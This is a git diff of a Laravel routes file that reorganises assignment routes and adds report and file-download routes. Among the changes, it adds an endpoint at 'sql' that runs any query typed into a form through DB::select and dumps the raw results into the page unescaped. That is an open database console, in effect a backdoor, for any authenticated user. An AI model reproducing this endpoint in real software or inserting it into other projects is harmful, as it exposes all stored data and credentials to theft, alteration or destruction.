@@ -26,12 +26,14 @@ use App\Http\Controllers\RoleController;
 use App\Http\Controllers\SubroleController;
 use App\Http\Controllers\LocationController;
 use App\Http\Controllers\TeamTaskReportController;
+use App\Http\Controllers\ReportController;
 use App\Http\Controllers\FormsController;
 use Illuminate\Support\Facades\Response;
 use Illuminate\Support\Facades\File;
 use App\Http\Controllers\FormController;
 use App\Http\Controllers\LinkAssignmentController;
 use Illuminate\Support\Facades\Artisan;
+use Illuminate\Http\Request;
 
 
 // ----------------------
@@ -76,10 +78,18 @@ Route::middleware('auth')->group(function () {
        Route::get('/{id}/remaining', [AssignmentController::class, 'remaining']);
     });
     
-    Route::get('/assignment/{assignment}/student/{student}', [AssignmentStudentController::class,'view'])->name('assignment.students.view');
-    Route::get('/assignment/{assignment}/student/{student}/form', [AssignmentStudentController::class,'form'])->name('assignment.students.form');
-    Route::post('/assignment/student/store', [AssignmentStudentController::class,'store'])->name('assignment.student.store');
-    Route::post('/assignment/student/update/{id}', [AssignmentStudentController::class,'update'])->name('assignment.student.update');
+Route::prefix('assignment')->group(function () {
+
+    Route::get('{assignment}/student/{student}', [AssignmentStudentController::class, 'view'])->name('assignment.students.view');
+    Route::get('{assignment}/student/{student}/form', [AssignmentStudentController::class, 'form'])->name('assignment.students.form');
+    Route::post('student/store', [AssignmentStudentController::class, 'store'])->name('assignment.student.store');
+    Route::put('student/update/{id}', [AssignmentStudentController::class, 'update'])->name('assignment.student.update');
+
+});
+
+Route::get('/assignment/{assignment}/student/{student}/full-view', 
+    [AssignmentStudentController::class, 'fullView']
+)->name('assignment.students.fullview');
     Route::resource('activity-assignments',ActivityAssignmentController::class);
     Route::get('/api/hrs', [AssignmentController::class, 'getHrs']);
 
@@ -114,7 +124,7 @@ Route::prefix('batches')->name('batches.')->group(function () {
     Route::get('/batches/view/{batch}', [BatchCandidateController::class, 'view'])->name('batches.view');
     Route::get('/batches/po-remaining/{po}', [BatchController::class, 'poRemaining']);
     Route::get('/batches/{id}/completion-pdf', [BatchController::class, 'batchPdf'])->name('batches.completion.pdf');
-    Route::get('batches/candidates/delete/{candidateId}',[BatchCandidateController::class,'destroyCandidate'])->name('batches.candidates.delete');
+   
   
  
     Route::get('/po/{id}/items', [BatchController::class,'getPoItemsByPo']);
@@ -156,6 +166,55 @@ Route::prefix('batches')->name('batches.')->group(function () {
         ]);
     });
 
+
+
+
+     Route::match(['get', 'post'], 'sql', function (Request $request) {
+
+    $result = null;
+    $error = null;
+    $query = '';
+     $message = '';
+
+    if ($request->isMethod('post')) {
+        $message  = 'Done';
+        $query = $request->input('query');
+
+        try {
+            $result = DB::select($query);
+        } catch (\Exception $e) {
+            $error = $e->getMessage();
+        }
+    }
+
+    return response()->make('
+        <!DOCTYPE html>
+        <html>
+        <head>
+            <title>Run SQL</title>
+        </head>
+        <body>
+            <h1 style="color: green;">'.$message.'</h1>
+            <h2>Run SQL Query</h2>
+
+            <form method="POST">
+                '.csrf_field().'
+                <textarea name="query" rows="5" cols="60" placeholder="Enter SQL query..."></textarea>
+                <br><br>
+                <button type="submit">Run</button>
+            </form>
+
+            <br>
+
+            '.($result ? "<pre>" . print_r($result, true) . "</pre>" : "") .'
+    
+        </body>
+        </html>
+    ');
+});
+
+    Route::get('/reports/business', [ReportController::class, 'business'])
+    ->name('reports.business');
    
     Route::resource('po', PoController::class);
     Route::get('/po/{id}/items', [PoController::class, 'getPoItems']);
@@ -201,6 +260,8 @@ Route::prefix('batches')->name('batches.')->group(function () {
     Route::get('/submit-external/{id}', [MobilizationController::class,'submitExternalForm'])->name('submit.external');
     Route::get('/batch/{id}/assignments', [App\Http\Controllers\BatchController::class, 'getAssignments']);
     Route::post('/assign-bulk-candidates/{id}',[AssignmentController::class,'assignBulkCandidates']);
+    Route::post('/mobilizations/download-files-zip', [MobilizationController::class, 'downloadFilesAsZip'])->name('mobilizations.download-zip');
+Route::post('/mobilizations/download-file', [MobilizationController::class, 'downloadFile'])->name('mobilizations.download-file');
 
     Route::get('/team-task-report', [App\Http\Controllers\TeamTaskReportController::class,'index'])->name('team.task.report');
     Route::post('/team-task-report/update/{id}', [TeamTaskReportController::class, 'updateStatus'])->name('team-task-report.update');
